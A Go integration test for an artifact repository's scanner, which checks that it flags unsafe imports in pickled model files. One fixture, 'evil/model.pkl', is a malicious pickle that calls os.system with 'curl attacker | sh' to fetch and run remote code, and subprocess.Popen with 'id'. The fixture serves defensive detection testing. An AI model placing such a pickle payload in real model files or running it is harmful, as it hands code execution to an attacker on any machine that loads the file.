//go:build integration

package scan_test

import (
	"errors"
	"log/slog"
	"os"
	"strings"
	"testing"

	"relic/internal/artifacts/repository"
	"relic/internal/platform/database/databasetest"
	"relic/internal/platform/objectstore/objectstoretest"
	"relic/internal/scanning/scan"
)

func TestModelScanning(t *testing.T) {
	t.Parallel()

	ctx := t.Context()
	db := databasetest.NewDB(t)
	blobs := objectstoretest.NewMemory()
	log := slog.New(slog.DiscardHandler)
	repos := repository.NewService(db, blobs, log)

	if err := repos.CreateRepository(ctx, repository.Repository{
		Name:   "models",
		Class:  "local",
		Format: "generic",
	}); err != nil {
		t.Fatal(err)
	}

	for path, body := range map[string]string{
		"evil/model.pkl":        "cos\nsystem\n(S'curl attacker | sh'\ntR0csubprocess\nPopen\n(S'id'\ntR.",
		"clean/model.pkl":       "\x80\x02ccollections\nOrderedDict\nq\x00)Rq\x01.",
		"blobs/random.bin":      "\x13\x37 random bytes, not a model",
		"clean/notes-model.txt": "not scanned",
	} {
		if _, err := repos.Deploy(ctx, repository.DeployInput{
			Repository: "models",
			Path:       path,
			Body:       strings.NewReader(body),
			User:       "admin",
		}); err != nil {
			t.Fatal(err)
		}
	}

	syft, grype, cataloged := fakeScanners(t)
	svc := scan.NewService(db, blobs, syft, grype, scan.Limits{}, log)
	svc.SetAnalyzers(scan.Model{})

	claimed, err := svc.Claim(ctx, 10)
	if err != nil || len(claimed) != 3 {
		t.Fatalf("claim = %v %v, want the two pickles and the .bin file", claimed, err)
	}

	critical := map[string]bool{}
	unsafe := map[string]bool{}

	for _, c := range claimed {
		if err := svc.ScanArtifact(ctx, c.Sha256, c.FileName); err != nil {
			t.Fatal(err)
		}

		if a, err := db.GetScanArtifact(ctx, c.Sha256); err != nil || a.Status != scan.StatusDone {
			t.Errorf("scan of %s = %s (%s), %v; want done", c.FileName, a.Status, a.Reason, err)
		}

		issues, err := scan.NewResults(db).Issues(ctx, c.Sha256)
		if err != nil {
			t.Fatal(err)
		}

		for _, i := range issues {
			if i.Analyzer == scan.AnalyzerModel && i.Severity == scan.SeverityCritical && i.Resource == "os.system" {
				critical[c.Sha256] = true
			}

			if i.Analyzer == scan.AnalyzerModel {
				unsafe[i.Resource] = true
			}
		}
	}

	if sources, err := os.ReadFile(cataloged); !errors.Is(err, os.ErrNotExist) {
		t.Errorf("syft cataloged %q, %v; want model files left to the model analyzer alone", sources, err)
	}

	if len(critical) != 1 {
		t.Errorf("critical model issues on %d files, want the one malicious pickle", len(critical))
	}

	if !unsafe["os.system"] || !unsafe["subprocess.Popen"] {
		t.Errorf("model issues on %v, want one for each unsafe import of the pickle", unsafe)
	}
}
